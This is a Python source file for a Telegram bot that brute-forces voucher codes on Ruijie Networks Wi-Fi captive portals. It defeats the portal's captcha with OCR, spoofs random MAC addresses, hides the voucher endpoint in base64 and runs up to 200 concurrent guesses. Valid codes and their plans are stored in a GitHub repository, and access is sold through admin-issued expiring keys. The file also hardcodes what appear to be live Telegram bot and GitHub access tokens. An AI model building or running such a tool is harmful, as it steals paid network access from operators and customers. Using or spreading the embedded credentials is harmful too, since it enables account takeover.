import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ── Environment variables ────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "8947878806:AAG1GmhB_jrARQ4LwO7pzKJV2UdbHC7_A1I")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN","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")
REPO_OWNER = os.getenv("REPO_OWNER", "phyoe001pp-design")
REPO_NAME = os.getenv("REPO_NAME", "MyBot")
ADMIN_ID = os.getenv("ADMIN_ID", "6658845504")

# ── Global structures ────────────────────────────────────────────────────
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}
approve = {}
scan_tasks = {}
success_texts = {}
limited_texts = {}
captcha_state = {}
notify_setting = {}

session = None
_connector = None
CONCURRENCY = 200
_voucher_sem = None
_start_time = time.monotonic()

# ── Helper: send long text ───────────────────────────────────────────────
async def send_chunks(chat_id, text, parse_mode="Markdown", reply_to_message_id=None):
    MAX = 4096
    if len(text) <= MAX:
        await bot.send_message(chat_id, text, parse_mode=parse_mode,
                               reply_to_message_id=reply_to_message_id)
        return
    lines = text.split("\n")
    chunk = ""
    first = True
    for line in lines:
        candidate = chunk + ("\n" if chunk else "") + line
        if len(candidate) > MAX:
            if chunk:
                await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                                       reply_to_message_id=reply_to_message_id if first else None)
                first = False
            chunk = line
        else:
            chunk = candidate
    if chunk:
        await bot.send_message(chat_id, chunk, parse_mode=parse_mode,
                               reply_to_message_id=reply_to_message_id if first else None)

# ── Web server (keep alive) ─────────────────────────────────────────────
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 5000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ── GitHub helpers ──────────────────────────────────────────────────────
async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    async with session.get(url, headers=headers) as response:
        if response.status == 200:
            data = await response.json()
            content = base64.b64decode(data['content']).decode('utf-8')
            return json.loads(content), data['sha']
    return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
        "sha": sha
    }
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

# ── Helper functions ────────────────────────────────────────────────────
def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(year=yyyy, month=MM, day=dd, hour=hh, minute=mm,
                                 second=0, tzinfo=timezone.utc)
        return datetime.now(timezone.utc) < expiration_dt
    except:
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    total_seconds = 0
    parts = re.findall(r'(\d+)([dhm])', plan)
    if not parts:
        return None
    for val, unit in parts:
        val = int(val)
        if unit == 'd':
            total_seconds += val * 86400
        elif unit == 'h':
            total_seconds += val * 3600
        elif unit == 'm':
            total_seconds += val * 60
    if total_seconds == 0:
        return None
    return (now + timedelta(seconds=total_seconds)).isoformat()

PLAN_RE = re.compile(r'^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$', re.IGNORECASE)

def plan_to_minutes(s):
    if not s:
        return 0
    s = s.strip().lower()
    if s in ('unlimit', 'unlimited'):
        return float('inf')
    total = 0
    for val, unit in re.findall(r'(\d+)\s*(mo|min|h|d|m)\b', s):
        val = int(val)
        if unit == 'mo':
            total += val * 30 * 24 * 60
        elif unit == 'd':
            total += val * 24 * 60
        elif unit == 'h':
            total += val * 60
        elif unit in ('min', 'm'):
            total += val
    return total

def iter_codes(mode):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if length == 8:
            while True:
                yield "".join(random.choice(string.digits) for _ in range(8))
        else:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
            return
    if mode == "all":
        chars = string.ascii_letters + string.digits
        while True:
            length = random.choice([6, 7, 8])
            yield "".join(random.choice(chars) for _ in range(length))
    if mode == "ascii-lower":
        while True:
            yield "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, target=None):
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {checked:,}",
        f"💎 Found: {found}",
    ]
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ── Captcha handling ────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(session_obj, session_url, previous_session_id=None):
    mac = get_mac()
    url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            return sid.group(1) if sid else previous_session_id
    except:
        return previous_session_id

async def Captcha_Image(session_obj, session_id):
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params) as req:
        return await req.read()

async def Varify_Captcha(session_obj, session_id, text):
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

async def check_session_url(session_url):
    try:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(session_url)
        params = parse_qs(parsed.query)
        required = ['gw_id', 'gw_address', 'gw_port', 'mac', 'ip']
        return all(k in params for k in required)
    except:
        return False

# ── Balance checker ────────────────────────────────────────────────────
def _parse_seconds(val):
    secs = int(val)
    hours = secs // 3600
    mins = (secs % 3600) // 60
    return f"{hours}h {mins}m" if hours > 0 else f"{mins}m" if mins > 0 else f"{secs}s"

def _parse_minutes(val):
    total_mins = int(val)
    if total_mins <= 0:
        return "0m"
    if total_mins < 60:
        return f"{total_mins}m"
    hours = total_mins // 60
    mins = total_mins % 60
    if hours < 24:
        return f"{hours}h {mins}m" if mins else f"{hours}h"
    days = hours // 24
    rem_hours = hours % 24
    if days < 30:
        return f"{days}d {rem_hours}h" if rem_hours else f"{days}d"
    months = days // 30
    rem_days = days % 30
    return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"

async def get_balance(session_id):
    """Get real plan and remaining time from Ruijie balance API with proper headers."""
    url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}"
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={session_id}&lang=en_US',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=15)) as bal_session:
            async with bal_session.get(url, headers=headers) as resp:
                if resp.status != 200:
                    text_resp = await resp.text()
                    print(f"[balance] HTTP {resp.status} – body: {text_resp[:300]}")
                    return "N/A"
                data = await resp.json()
                print(f"[balance] SUCCESS: {json.dumps(data, indent=2)[:600]}")
                
                # Check all possible locations for profileName
                plan_name = None
                candidates = [data]
                if isinstance(data.get('result'), dict):
                    candidates.append(data['result'])
                if isinstance(data.get('data'), dict):
                    candidates.append(data['data'])
                
                for src in candidates:
                    if plan_name:
                        break
                    for key in ['profileName', 'profile_name', 'planName', 'plan_name', 'name', 'package', 'packageName', 'profile']:
                        if src.get(key):
                            plan_name = str(src[key])
                            break
                plan_name = plan_name or 'Unknown'
                
                # Check all possible locations for time
                remaining = None
                for src in candidates:
                    if remaining:
                        break
                    # Minutes
                    for key in ['totalMinutes', 'remainingMinutes', 'remainMinutes', 'leftMinutes', 'balance', 'minutes', 'total_minutes', 'remaining_minutes']:
                        val = src.get(key)
                        if val is not None:
                            try:
                                remaining = _parse_minutes(int(val))
                                break
                            except:
                                pass
                
                if not remaining:
                    for src in candidates:
                        if remaining:
                            break
                        # Seconds
                        for key in ['remainingSeconds', 'remainTime', 'remainingTime', 'leftTime', 'timeLeft', 'remain_time', 'seconds', 'totalSeconds', 'total_seconds']:
                            val = src.get(key)
                            if val is not None:
                                try:
                                    remaining = _parse_seconds(int(val))
                                    break
                                except:
                                    pass
                
                # Try expiry timestamp
                if not remaining:
                    for src in candidates:
                        if remaining:
                            break
                        for key in ['expireAt', 'expire_at', 'expire', 'expiry', 'expiration', 'endTime']:
                            val = src.get(key)
                            if val:
                                try:
                                    exp = datetime.fromisoformat(str(val).replace('Z', '+00:00'))
                                    now = datetime.now(timezone.utc)
                                    diff = exp - now
                                    total_secs = int(diff.total_seconds())
                                    if total_secs > 0:
                                        remaining = _parse_seconds(total_secs)
                                        break
                                except:
                                    pass
                
                remaining = remaining or 'Unknown'
                print(f"[balance] FINAL: Plan={plan_name}, Time={remaining}")
                return f"📋 {plan_name} | ⏳ {remaining}"
                
    except Exception as e:
        print(f"[balance] ERROR: {e}")
        import traceback
        traceback.print_exc()
        return "Error"

# ── Core voucher check ─────────────────────────────────────────────────
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    response = None
    auth_session_id = None

    for attempt in range(3):
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=30)) as task_session:
            session_id = await get_session_id(task_session, session_url)
            if not session_id:
                continue
            auth_code = None
            for _ in range(8):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    if await Varify_Captcha(task_session, session_id, text):
                        auth_code = text
                        break
                except:
                    continue
            if not auth_code:
                continue
            data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            try:
                async with task_session.post(post_url, json=data) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    
                    # Extract authenticated sessionId from logonUrl
                    if 'logonUrl' in resp_json:
                        logon_url = resp_json['logonUrl']
                        sid_match = re.search(r'sessionId=([a-fA-F0-9]+)', logon_url)
                        if sid_match:
                            auth_session_id = sid_match.group(1)
                            print(f"[voucher] auth sessionId from logonUrl: {auth_session_id}")
                        else:
                            auth_session_id = session_id
            except:
                return
        if response and 'request limited' in response:
            continue
        break

    if not response:
        return
    
    if 'logonUrl' in response:
        if recheck:
            return code
        
        balance_sid = auth_session_id if auth_session_id else session_id
        plan_str = await get_balance(balance_sid)
        
        if plan_filters:
            if not any(plan_to_minutes(plan_str) >= plan_to_minutes(f) for f in plan_filters):
                return None
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        success_texts[chat_id].append({"code": code, "session_id": balance_sid, "plan": plan_str})
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code, "session_id": balance_sid, "plan": plan_str})
        if notify_setting.get(chat_id, False) and message:
            items = success_texts[chat_id]
            n = len(items)
            text = f"✅ Success Code ({n}):\n`{code}` – ⏳ {plan_str}"
            await bot.send_message(chat_id, text, parse_mode="Markdown")
        return code
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        limited_texts[chat_id].append(code)
        return None

# ── Brute-force runner ─────────────────────────────────────────────────
async def run_bruteforce(mode, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    checked, found = 0, 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
                return
            batch = []
            for _ in range(100):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            results = await asyncio.gather(*[perform_check(session_url, c, chat_id, scan_id, message=message, plan_filters=plan_filters) for c in batch], return_exceptions=True)
            for res in results:
                if res:
                    found += 1
                    if target and found >= target:
                        await progress_msg.edit_text("🎯 Target reached!")
                        return
            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            text = format_progress(checked, None, speed, found, target)
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except:
                pass
    finally:
        scan_tasks.pop(chat_id, None)

# ── GitHub scheduler ───────────────────────────────────────────────────
async def github_update_scheduler():
    while True:
        await asyncio.sleep(80)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results, sha = await get_file_content("result.json")
                for item in items:
                    cid = str(item["chat_id"])
                    if cid not in results:
                        results[cid] = []
                    results[cid].append({"code": item["code"], "session_id": item["session_id"], "plan": item["plan"]})
                await update_file_content("result.json", results, sha, "Update Results")
            except:
                pass

# ── Bot commands ───────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📚 **Command လမ်းညွှန်**\n\n"
        "/key - သင်၏ key ကို အတည်ပြုရန်\n"
        "/setup [session_url] - Session URL သတ်မှတ်ရန်\n"
        "/brute <mode> [target] [plan] - Code ရှာဖွေရန်\n"
        "   Mode: 6, 7, 8, all\n"
        "   /brute 6 10 1d (၆ လုံး၊ ၁၀ ခု၊ ၁ ရက်)\n"
        "/stop - ရပ်ရန်\n"
        "/saved - သိမ်းထားသော code များကြည့်ရန်\n"
        "/notify - အကြောင်းကြားချက် On/Off\n"
        "/genkey <duration> <user_id> - (Admin) Key ထုတ်ရန်"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    cid = message.chat.id
    if str(cid) == ADMIN_ID:
        approve[cid] = True
        await bot.reply_to(message, "✅ Admin အဖြစ် အတည်ပြုပြီးပါပြီ။ /setup ဖြင့် စတင်ပါ။")
        return
    auth_list, _ = await get_file_content("auth_list.json")
    if str(cid) in auth_list:
        if check_key_expiration(auth_list[str(cid)]):
            approve[cid] = True
            await bot.reply_to(message, "✅ Key မှန်ကန်ပါသည်။ /setup ဖြင့် စတင်ပါ။")
        else:
            await bot.reply_to(message, "❌ Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို register မလုပ်ရသေးပါ။")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /setup your_session_url")
        return
    if not approve.get(message.chat.id, False):
        await bot.reply_to(message, "/key အရင်လုပ်ပါ။")
        return
    url = args[1]
    if await check_session_url(url):
        user_data[message.chat.id] = {'session_url': url}
        await bot.reply_to(message, "✅ Setup ပြီးပါပြီ။ /brute ဖြင့် စတင်ပါ။")
    else:
        await bot.reply_to(message, "❌ URL မှားနေပါသည်။")

@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /brute <mode> [target] [plan]")
        return
    mode = args[1]
    target = int(args[2]) if len(args) > 2 and args[2].isdigit() else None
    plan_filters = [a for a in args[3:] if PLAN_RE.match(a)]
    cid = message.chat.id
    if not approve.get(cid, False):
        await bot.reply_to(message, "/key အရင်လုပ်ပါ။")
        return
    if cid not in user_data:
        await bot.reply_to(message, "/setup အရင်လုပ်ပါ။")
        return
    progress_msg = await bot.send_message(cid, f"Scanning (Mode: {mode})...")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_bruteforce(mode, cid, user_data[cid]['session_url'], scan_id, target, message, progress_msg, plan_filters))
    scan_tasks[cid] = {"task": task, "stop": False, "scan_id": scan_id}

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    data = scan_tasks.get(message.chat.id)
    if data:
        data["stop"] = True
        await bot.reply_to(message, "🛑 Scan ရပ်လိုက်ပါပြီ။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    success = success_texts.get(message.chat.id, [])
    if not success:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိပါ။")
        return
    lines = ["✅ **Success Codes:**"]
    for it in success:
        lines.append(f"`{it['code']}` – ⏳ {it['plan']}")
    await send_chunks(message.chat.id, "\n".join(lines))

@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    cid = message.chat.id
    notify_setting[cid] = not notify_setting.get(cid, False)
    await bot.reply_to(message, f"Notify: {'ON' if notify_setting[cid] else 'OFF'}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage: /genkey <duration> <user_id>")
        return
    plan, uid = args[1], args[2]
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, "Duration မှားနေသည်။ (ဥပမာ: 1h, 1d, unlimited)")
        return
    auth_list, sha = await get_file_content("auth_list.json")
    auth_list[uid] = {"expires_at": expiry, "plan": plan}
    await update_file_content("auth_list.json", auth_list, sha, f"Add key for {uid}")
    await bot.reply_to(message, f"✅ Key ထုတ်ပေးပြီးပါပြီ။\nUID: {uid}\nExpires: {expiry}")

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=CONCURRENCY, ssl=False)
    session = aiohttp.ClientSession(connector=_connector)
    asyncio.create_task(web_server())
    asyncio.create_task(github_update_scheduler())
    await bot.polling(non_stop=True)

if __name__ == "__main__":
    asyncio.run(main())